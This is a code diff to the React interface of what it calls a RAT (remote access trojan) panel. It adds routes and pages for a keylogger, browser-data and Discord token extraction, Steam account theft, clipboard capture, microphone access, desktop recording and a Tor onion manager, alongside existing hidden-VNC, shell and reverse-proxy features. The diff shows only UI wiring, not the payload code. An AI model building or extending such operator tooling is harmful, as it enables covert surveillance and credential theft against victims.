@@ -18,15 +18,37 @@ import {
   stopReverseProxyCmd,
   stopShellCmd,
   manageHVNC,
+  stopKeyloggerCmd,
 } from "./rat/RATCommands";
 import { HVNC } from "./pages/HVNC";
 import { WorldMap } from "./pages/WorldMap";
 import { FunPanel } from "./pages/Fun";
 import { InputBox } from "./pages/InputBox";
+import { OnionManager } from "./pages/OnionManager";
+import { TorStartupModal } from "./components/TorStartupModal";
+import { useLocation } from "react-router-dom";
+import { Keylogger } from "./pages/Keylogger";
+import { BrowserData } from "./pages/BrowserData";
+import { DataCollector } from "./pages/DataCollector";
+import { Clipboard } from "./pages/Clipboard";
+import { Software } from "./pages/Software";
+import { SteamAccount } from "./pages/SteamAccount";
+import { MicAccess } from "./pages/MicAccess";
+import { DesktopRecording } from "./pages/DesktopRecording";
+import { DiscordExtractor } from "./pages/DiscordExtractor";
+
+const TorStartupModalContainer: React.FC = () => {
+  const location = useLocation();
+  const isMainAppRoute = /^\/($|logs|worldmap|settings|onion)/.test(location.pathname);
+
+  if (!isMainAppRoute) return null;
+  return <TorStartupModal />;
+};
 
 export const App: React.FC = () => {
   return (
     <RATProvider>
+      <TorStartupModalContainer />
       <Routes>
         <Route
           path="/reverse-proxy/:addr"
@@ -67,6 +89,30 @@ export const App: React.FC = () => {
               }}
             >
               <RemoteDesktop />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/mic-access/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <MicAccess />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/desktop-recording/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <DesktopRecording />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/discord-extractor/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <DiscordExtractor />
             </WindowWrapper>
           }
         />
@@ -117,6 +163,60 @@ export const App: React.FC = () => {
           }
         />
         <Route
+          path="/keylogger/:addr"
+          element={
+            <WindowWrapper
+              feature_cleanup={(params) => {
+                if (params.addr) {
+                  stopKeyloggerCmd(params.addr);
+                }
+              }}
+            >
+              <Keylogger />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/browser-data/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <BrowserData />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/data-collector/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <DataCollector />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/clipboard/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <Clipboard />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/software/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <Software />
+            </WindowWrapper>
+          }
+        />
+        <Route
+          path="/steam-account/:addr"
+          element={
+            <WindowWrapper feature_cleanup={() => {}}>
+              <SteamAccount />
+            </WindowWrapper>
+          }
+        />
+        <Route
           path="/client-info/:addr"
           element={
             <WindowWrapper feature_cleanup={() => {}}>
@@ -129,6 +229,7 @@ export const App: React.FC = () => {
           <Route path="/logs" element={<Logs />} />
           <Route path="/worldmap" element={<WorldMap />} />
           <Route path="/settings" element={<Settings />} />
+          <Route path="/onion" element={<OnionManager />} />
         </Route>
       </Routes>
     </RATProvider>
